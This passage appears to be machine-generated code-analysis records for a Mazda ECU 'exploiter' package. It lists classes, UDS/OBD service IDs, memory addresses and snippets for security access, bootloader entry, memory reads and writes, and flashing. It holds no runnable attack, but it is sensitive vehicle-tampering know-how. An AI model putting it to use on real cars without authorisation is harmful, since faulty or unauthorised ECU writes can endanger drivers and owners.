{"file_path": "mazda_diag/__init__.py", "lines_read": 9, "features_found": [{"type": "import", "module": ".protocol", "line": null}, {"type": "import", "module": ".security", "line": null}, {"type": "import", "module": "MazdaDiagnosticProtocol,", "line": null}, {"type": "import", "module": "MazdaSecurityAccess,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "security algorithms, and high-level functions for vehicle interaction."}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "security algorithms, and high-level functions for vehicle interaction."}, {"type": "hardware", "line": 8, "hardware": "ECU", "content": "from .security import MazdaSecurityAccess, MazdaSecurityAlgorithm"}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "security algorithms, and high-level functions for vehicle interaction."}, {"type": "security_pattern", "line": 8, "pattern": "algorithm", "content": "from .security import MazdaSecurityAccess, MazdaSecurityAlgorithm"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_ecu_exploiter.py", "lines_read": 885, "features_found": [{"type": "function", "name": "to_dict", "line": 40}, {"type": "function", "name": "elapsed_time", "line": 71}, {"type": "function", "name": "eta_seconds", "line": 76}, {"type": "function", "name": "__init__", "line": 128}, {"type": "function", "name": "_estimate_flash_time", "line": 853}, {"type": "function", "name": "get_flash_sessions", "line": 864}, {"type": "function", "name": "get_ecu_status", "line": 868}, {"type": "function", "name": "__del__", "line": 879}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_memory_map", "line": null}, {"type": "import", "module": "base_exploiter", "line": null}, {"type": "import", "module": "eeprom_exploiter", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaMemoryMap,", "line": null}, {"type": "import", "module": "BaseExploiter,", "line": null}, {"type": "import", "module": "EEPROMExploiter", "line": null}], "components_found": [{"type": "class", "name": "ECUInfo", "line": 27}, {"type": "class", "name": "FlashSession", "line": 57}, {"type": "class", "name": "ECUExploiterError", "line": 83}, {"type": "class", "name": "ECUCommunicationError", "line": 88}, {"type": "class", "name": "ECUFlashError", "line": 93}, {"type": "class", "name": "MazdaECUExploiter", "line": 98}], "algorithms": [], "protocols": [{"type": "protocol", "line": 18, "protocol": "CAN", "content": "LogEntry, CANMessage, OBDPacket, TelemetryData, DiagnosticTroubleCode,"}, {"type": "protocol", "line": 18, "protocol": "OBD", "content": "LogEntry, CANMessage, OBDPacket, TelemetryData, DiagnosticTroubleCode,"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "\"READ_VIN\": 0x1A,"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "\"READ_ECU_INFO\": 0x1A,"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "\"RESET_ECU\": 0x11,"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ENTER_BOOTLOADER\": 0x85,"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "\"EXIT_BOOTLOADER\": 0x86,"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FLASH_ERASE\": 0x31,"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FLASH_PROGRAM\": 0x3D,"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FLASH_VERIFY\": 0x31,"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "\"SECURITY_ACCESS\": 0x27,"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TESTER_PRESENT\": 0x3E,"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "\"DIAGNOSTIC_SESSION\": 0x10,"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x01])  # Default diagnostic session"}, {"type": "protocol", "line": 208, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x00])"}, {"type": "protocol", "line": 247, "protocol": "OBD", "content": "async def _send_ecu_command(self, service_id: int, data: bytes) -> OBDPacket:"}, {"type": "protocol", "line": 249, "protocol": "OBD", "content": "Send ECU-specific command via OBD."}, {"type": "protocol", "line": 256, "protocol": "OBD", "content": "OBD response packet"}, {"type": "protocol", "line": 269, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response.data) > 0 and response.data[0] == service_id + 0x40:"}, {"type": "protocol", "line": 274, "protocol": "0x[0-9A-Fa-f]+", "content": "response.data[0] == 0x7F and"}, {"type": "protocol", "line": 276, "protocol": "0x[0-9A-Fa-f]+", "content": "error_code = response.data[2] if len(response.data) > 2 else 0x00"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "0x23,  # Read memory by address"}, {"type": "protocol", "line": 390, "protocol": "0x[0-9A-Fa-f]+", "content": "0x34,  # Request download"}, {"type": "protocol", "line": 405, "protocol": "0x[0-9A-Fa-f]+", "content": "0x36,  # Transfer data"}, {"type": "protocol", "line": 417, "protocol": "0x[0-9A-Fa-f]+", "content": "0x37,  # Transfer exit"}, {"type": "protocol", "line": 459, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x90])  # VIN identifier"}, {"type": "protocol", "line": 496, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x86])  # ECU serial identifier"}, {"type": "protocol", "line": 507, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x87])  # Software version identifier"}, {"type": "protocol", "line": 518, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x88])  # Calibration version identifier"}, {"type": "protocol", "line": 529, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x89])  # Hardware version identifier"}, {"type": "protocol", "line": 694, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x01])  # Hard reset"}, {"type": "protocol", "line": 734, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x01])  # Enter bootloader"}, {"type": "protocol", "line": 772, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x01])  # Exit bootloader"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "MazdaECUExploiter - Main ECU interface and exploitation coordinator."}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides high-level ECU operations, coordinates all sub-exploiters, and manages"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, FlashOperation, FlashState,"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "TuningParameter, TuningProfile, VehicleState, ECUOperation, ECUState, ExploiterState"}, {"type": "hardware", "line": 19, "hardware": "vehicle", "content": "TuningParameter, TuningProfile, VehicleState, ECUOperation, ECUState, ExploiterState"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "class ECUInfo:"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "\"\"\"ECU identification and status information.\"\"\""}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "ecu_serial: str = \"\""}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "state: ECUState = ECUState.OFFLINE"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "\"ecu_serial\": self.ecu_serial,"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "operation_type: ECUOperation"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "class ECUExploiterError(ExploiterError):"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "\"\"\"ECU exploiter specific errors.\"\"\""}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "class ECUCommunicationError(ECUExploiterError):"}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "\"\"\"ECU communication failure.\"\"\""}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "class ECUFlashError(ECUExploiterError):"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "\"\"\"ECU flash operation failure.\"\"\""}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "class MazdaECUExploiter(BaseExploiter):"}, {"type": "hardware", "line": 100, "hardware": "ECU", "content": "Main ECU exploitation module for Mazda vehicles."}, {"type": "hardware", "line": 100, "hardware": "vehicle", "content": "Main ECU exploitation module for Mazda vehicles."}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "Coordinates all sub-exploiters and provides high-level ECU operations."}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "ECU_COMMANDS = {"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "\"READ_ECU_INFO\": 0x1A,"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "\"RESET_ECU\": 0x11,"}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "\"SECURITY_ACCESS\": 0x27,"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "ECU_TIMING = {"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "\"\"\"Initialize ECU exploiter.\"\"\""}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "super().__init__(\"ECU\", config)"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "self.ecu_info = ECUInfo()"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "self.current_state = ECUState.OFFLINE"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "self.logger.info(\"MazdaECUExploiter initialized\")"}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "\"\"\"Initialize ECU-specific components and sub-exploiters.\"\"\""}, {"type": "hardware", "line": 164, "hardware": "ECU", "content": "raise ECUExploiterError(f\"EEPROM exploiter init failed: {eeprom_result.error_message}\")"}, {"type": "hardware", "line": 167, "hardware": "ECU", "content": "await self._connect_to_ecu()"}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "await self._identify_ecu()"}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "self.current_state = ECUState.NORMAL"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "self.logger.info(\"ECU exploiter initialized successfully\")"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "self.logger.error(f\"ECU initialization failed: {e}\")"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "raise ECUExploiterError(f\"ECU initialization failed: {e}\")"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "\"\"\"Shutdown ECU-specific components.\"\"\""}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "self.current_state = ECUState.OFFLINE"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "self.logger.info(\"ECU exploiter shutdown completed\")"}, {"type": "hardware", "line": 194, "hardware": "ECU", "content": "self.logger.warning(f\"ECU shutdown warning: {e}\")"}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "async def _connect_to_ecu(self) -> None:"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "\"\"\"Establish communication with ECU.\"\"\""}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"DIAGNOSTIC_SESSION\"],"}, {"type": "hardware", "line": 206, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"TESTER_PRESENT\"],"}, {"type": "hardware", "line": 211, "hardware": "ECU", "content": "self.logger.info(\"ECU communication established\")"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "raise ECUCommunicationError(f\"Failed to connect to ECU: {e}\")"}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "async def _identify_ecu(self) -> None:"}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "\"\"\"Identify ECU and gather information.\"\"\""}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "self.ecu_info.vin = vin_result.data"}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "info_result = await self.get_ecu_info()"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "self.ecu_info.ecu_serial = info_data.get(\"serial\", \"\")"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "self.ecu_info.software_version = info_data.get(\"software_version\", \"\")"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "self.ecu_info.calibration_version = info_data.get(\"calibration_version\", \"\")"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "self.ecu_info.hardware_version = info_data.get(\"hardware_version\", \"\")"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "self.ecu_info.flash_size = info_data.get(\"flash_size\", 0)"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "self.ecu_info.eeprom_size = info_data.get(\"eeprom_size\", 0)"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "self.ecu_info.supported_operations = ["}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "\"read_dtc\", \"clear_dtc\", \"backup_ecu\", \"restore_ecu\","}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "\"read_vin\", \"get_info\", \"reset_ecu\""}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "self.logger.info(f\"ECU identified: VIN={self.ecu_info.vin}, SW={self.ecu_info.software_version}\")"}, {"type": "hardware", "line": 245, "hardware": "ECU", "content": "self.logger.warning(f\"ECU identification incomplete: {e}\")"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "async def _send_ecu_command(self, service_id: int, data: bytes) -> OBDPacket:"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "Send ECU-specific command via OBD."}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "service_id: ECU service ID"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "raise ECUCommunicationError(f\"ECU command rejected with error code: 0x{error_code:02X}\")"}, {"type": "hardware", "line": 279, "hardware": "ECU", "content": "raise ECUCommunicationError(\"Invalid ECU response format\")"}, {"type": "hardware", "line": 282, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "Read data from ECU memory."}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 298, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"read ECU memory\")"}, {"type": "hardware", "line": 304, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Unknown memory region: 0x{address:06X}\")"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "return await self._execute_with_retry("}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "\"\"\"Direct ECU memory read implementation.\"\"\""}, {"type": "hardware", "line": 326, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 333, "hardware": "ECU", "content": "raise ECUExploiterError(\"Invalid memory read response\")"}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Read size mismatch: expected {block_size}, got {len(block_data)}\")"}, {"type": "hardware", "line": 348, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None,"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "Write data to ECU memory."}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 368, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.TUNING, \"write ECU memory\")"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Unknown memory region: 0x{address:06X}\")"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "return await self._execute_with_retry("}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "\"\"\"Direct ECU memory write implementation.\"\"\""}, {"type": "hardware", "line": 389, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 404, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 413, "hardware": "ECU", "content": "await asyncio.sleep(self.ECU_TIMING[\"flash_byte_program_ms\"] * block_size / 1000.0)"}, {"type": "hardware", "line": 416, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 425, "hardware": "ECU", "content": "raise ECUFlashError(\"Write verification failed: data mismatch\")"}, {"type": "hardware", "line": 429, "hardware": "ECU", "content": "async def read_vin(self, credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 431, "hardware": "vehicle", "content": "Read Vehicle Identification Number."}, {"type": "hardware", "line": 434, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 442, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"read VIN\")"}, {"type": "hardware", "line": 457, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"READ_VIN\"],"}, {"type": "hardware", "line": 472, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Failed to read VIN: {e}, fallback: {fallback_error}\")"}, {"type": "hardware", "line": 474, "hardware": "ECU", "content": "async def get_ecu_info(self, credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 476, "hardware": "ECU", "content": "Get ECU identification and status information."}, {"type": "hardware", "line": 479, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 482, "hardware": "ECU", "content": "OperationResult with ECU info"}, {"type": "hardware", "line": 487, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"get ECU info\")"}, {"type": "hardware", "line": 494, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 495, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"READ_ECU_INFO\"],"}, {"type": "hardware", "line": 496, "hardware": "ECU", "content": "bytes([0x86])  # ECU serial identifier"}, {"type": "hardware", "line": 505, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 506, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"READ_ECU_INFO\"],"}, {"type": "hardware", "line": 516, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 517, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"READ_ECU_INFO\"],"}, {"type": "hardware", "line": 527, "hardware": "ECU", "content": "response = await self._send_ecu_command("}, {"type": "hardware", "line": 528, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"READ_ECU_INFO\"],"}, {"type": "hardware", "line": 542, "hardware": "ECU", "content": "operation_id=\"get_ecu_info\","}, {"type": "hardware", "line": 547, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Failed to get ECU info: {e}\")"}, {"type": "hardware", "line": 549, "hardware": "ECU", "content": "async def backup_ecu(self, include_calibration: bool = True,"}, {"type": "hardware", "line": 551, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 553, "hardware": "ECU", "content": "Create complete ECU backup."}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 566, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.DIAGNOSTIC, \"backup ECU\")"}, {"type": "hardware", "line": 569, "hardware": "ECU", "content": "backup_id = f\"ecu_backup_{int(time.time())}\""}, {"type": "hardware", "line": 598, "hardware": "ECU", "content": "\"vin\": self.ecu_info.vin,"}, {"type": "hardware", "line": 599, "hardware": "ECU", "content": "\"ecu_info\": self.ecu_info.to_dict(),"}, {"type": "hardware", "line": 603, "hardware": "ECU", "content": "self.logger.info(f\"ECU backup created: {backup_id}\")"}, {"type": "hardware", "line": 607, "hardware": "ECU", "content": "operation_id=\"backup_ecu\","}, {"type": "hardware", "line": 612, "hardware": "ECU", "content": "raise ECUExploiterError(f\"ECU backup failed: {e}\")"}, {"type": "hardware", "line": 614, "hardware": "ECU", "content": "async def restore_ecu(self, backup_data: Dict[str, Any],"}, {"type": "hardware", "line": 616, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 618, "hardware": "ECU", "content": "Restore ECU from backup."}, {"type": "hardware", "line": 623, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 631, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.FLASH, \"restore ECU\")"}, {"type": "hardware", "line": 636, "hardware": "ECU", "content": "raise ECUExploiterError(\"Invalid backup: missing metadata\")"}, {"type": "hardware", "line": 641, "hardware": "ECU", "content": "self.logger.info(f\"Starting ECU restore: {backup_id}\")"}, {"type": "hardware", "line": 652, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Calibration restore failed: {write_result.error_message}\")"}, {"type": "hardware", "line": 662, "hardware": "ECU", "content": "raise ECUExploiterError(f\"EEPROM restore failed: {restore_result.error_message}\")"}, {"type": "hardware", "line": 664, "hardware": "ECU", "content": "self.logger.info(f\"ECU restore completed: {backup_id}\")"}, {"type": "hardware", "line": 668, "hardware": "ECU", "content": "operation_id=\"restore_ecu\","}, {"type": "hardware", "line": 673, "hardware": "ECU", "content": "raise ECUExploiterError(f\"ECU restore failed: {e}\")"}, {"type": "hardware", "line": 675, "hardware": "ECU", "content": "async def reset_ecu(self, credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 677, "hardware": "ECU", "content": "Reset ECU."}, {"type": "hardware", "line": 680, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 688, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.DIAGNOSTIC, \"reset ECU\")"}, {"type": "hardware", "line": 692, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 693, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"RESET_ECU\"],"}, {"type": "hardware", "line": 698, "hardware": "ECU", "content": "await asyncio.sleep(self.ECU_TIMING[\"reset_delay_ms\"] / 1000.0)"}, {"type": "hardware", "line": 701, "hardware": "ECU", "content": "await self._connect_to_ecu()"}, {"type": "hardware", "line": 702, "hardware": "ECU", "content": "await self._identify_ecu()"}, {"type": "hardware", "line": 704, "hardware": "ECU", "content": "self.logger.info(\"ECU reset completed\")"}, {"type": "hardware", "line": 708, "hardware": "ECU", "content": "operation_id=\"reset_ecu\","}, {"type": "hardware", "line": 713, "hardware": "ECU", "content": "raise ECUExploiterError(f\"ECU reset failed: {e}\")"}, {"type": "hardware", "line": 715, "hardware": "ECU", "content": "async def enter_bootloader(self, credentials: Optional[SecurityCredentials] = None) -> OperationResu"}, {"type": "hardware", "line": 720, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 728, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.FLASH, \"enter bootloader\")"}, {"type": "hardware", "line": 732, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 733, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"ENTER_BOOTLOADER\"],"}, {"type": "hardware", "line": 738, "hardware": "ECU", "content": "await asyncio.sleep(self.ECU_TIMING[\"bootloader_enter_ms\"] / 1000.0)"}, {"type": "hardware", "line": 740, "hardware": "ECU", "content": "self.current_state = ECUState.BOOTLOADER"}, {"type": "hardware", "line": 742, "hardware": "ECU", "content": "self.logger.info(\"ECU entered bootloader mode\")"}, {"type": "hardware", "line": 751, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Failed to enter bootloader: {e}\")"}, {"type": "hardware", "line": 753, "hardware": "ECU", "content": "async def exit_bootloader(self, credentials: Optional[SecurityCredentials] = None) -> OperationResul"}, {"type": "hardware", "line": 758, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 766, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.FLASH, \"exit bootloader\")"}, {"type": "hardware", "line": 770, "hardware": "ECU", "content": "await self._send_ecu_command("}, {"type": "hardware", "line": 771, "hardware": "ECU", "content": "self.ECU_COMMANDS[\"EXIT_BOOTLOADER\"],"}, {"type": "hardware", "line": 779, "hardware": "ECU", "content": "await self._connect_to_ecu()"}, {"type": "hardware", "line": 780, "hardware": "ECU", "content": "self.current_state = ECUState.NORMAL"}, {"type": "hardware", "line": 782, "hardware": "ECU", "content": "self.logger.info(\"ECU exited bootloader mode\")"}, {"type": "hardware", "line": 791, "hardware": "ECU", "content": "raise ECUExploiterError(f\"Failed to exit bootloader: {e}\")"}, {"type": "hardware", "line": 793, "hardware": "ECU", "content": "async def start_flash_session(self, operation_type: ECUOperation,"}, {"type": "hardware", "line": 853, "hardware": "ECU", "content": "def _estimate_flash_time(self, operation_type: ECUOperation, size: int) -> float:"}, {"type": "hardware", "line": 855, "hardware": "ECU", "content": "if operation_type == ECUOperation.FLASH_CALIBRATION:"}, {"type": "hardware", "line": 857, "hardware": "ECU", "content": "erase_time = (size / 4096) * self.ECU_TIMING[\"flash_sector_erase_ms\"]"}, {"type": "hardware", "line": 858, "hardware": "ECU", "content": "program_time = size * self.ECU_TIMING[\"flash_byte_program_ms\"]"}, {"type": "hardware", "line": 859, "hardware": "ECU", "content": "verify_time = size * self.ECU_TIMING[\"verification_byte_ms\"]"}, {"type": "hardware", "line": 868, "hardware": "ECU", "content": "def get_ecu_status(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 869, "hardware": "ECU", "content": "\"\"\"Get current ECU status.\"\"\""}, {"type": "hardware", "line": 872, "hardware": "ECU", "content": "\"ecu_info\": self.ecu_info.to_dict(),"}], "security_logic": [{"type": "security_pattern", "line": 114, "pattern": "security_access", "content": "\"SECURITY_ACCESS\": 0x27,"}, {"type": "security_pattern", "line": 183, "pattern": "key", "content": "for session_id in list(self.flash_sessions.keys()):"}, {"type": "security_pattern", "line": 657, "pattern": "key", "content": "if \"backup_key\" in eeprom_data:"}, {"type": "security_pattern", "line": 659, "pattern": "key", "content": "eeprom_data[\"backup_key\"]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_memory_map.py", "lines_read": 746, "features_found": [{"type": "function", "name": "__post_init__", "line": 54}, {"type": "function", "name": "contains", "line": 63}, {"type": "function", "name": "overlaps", "line": 67}, {"type": "function", "name": "get_checksum_range", "line": 72}, {"type": "function", "name": "validate_value", "line": 95}, {"type": "function", "name": "contains", "line": 113}, {"type": "function", "name": "__init__", "line": 425}, {"type": "function", "name": "_validate_memory_regions", "line": 440}, {"type": "function", "name": "_build_lookup_tables", "line": 452}, {"type": "function", "name": "_calculate_region_checksums", "line": 474}, {"type": "function", "name": "get_region", "line": 485}, {"type": "function", "name": "get_region_by_name", "line": 497}, {"type": "function", "name": "get_table", "line": 509}, {"type": "function", "name": "get_sector", "line": 521}, {"type": "function", "name": "get_sectors_for_range", "line": 533}, {"type": "function", "name": "validate_access", "line": 551}, {"type": "function", "name": "is_critical_address", "line": 589}, {"type": "function", "name": "requires_backup", "line": 602}, {"type": "function", "name": "get_critical_addresses", "line": 622}, {"type": "function", "name": "get_calibration_tables", "line": 626}, {"type": "function", "name": "get_memory_regions", "line": 630}, {"type": "function", "name": "get_flash_sectors", "line": 634}, {"type": "function", "name": "calculate_checksum", "line": 638}, {"type": "function", "name": "validate_table_data", "line": 658}, {"type": "function", "name": "get_safe_write_regions", "line": 685}, {"type": "function", "name": "export_memory_map", "line": 704}, {"type": "function", "name": "__del__", "line": 743}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "SecurityLevel,", "line": null}], "components_found": [{"type": "class", "name": "MemoryRegion", "line": 18}, {"type": "class", "name": "AccessType", "line": 30}, {"type": "class", "name": "MemoryRange", "line": 40}, {"type": "class", "name": "CalibrationTable", "line": 80}, {"type": "class", "name": "FlashSector", "line": 104}, {"type": "class", "name": "MemoryMapError", "line": 118}, {"type": "class", "name": "MazdaMemoryMap", "line": 123}], "algorithms": [{"type": "algorithm_function", "line": 474, "content": "def _calculate_region_checksums(self) -> None:"}, {"type": "algorithm_function", "line": 638, "content": "def calculate_checksum(self, data: bytes, algorithm: str = \"crc32\") -> str:"}], "protocols": [{"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x000000,"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x020000,"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x020000,  # 128KB"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x020000,"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x180000,"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x160000,  # 1.376MB"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": 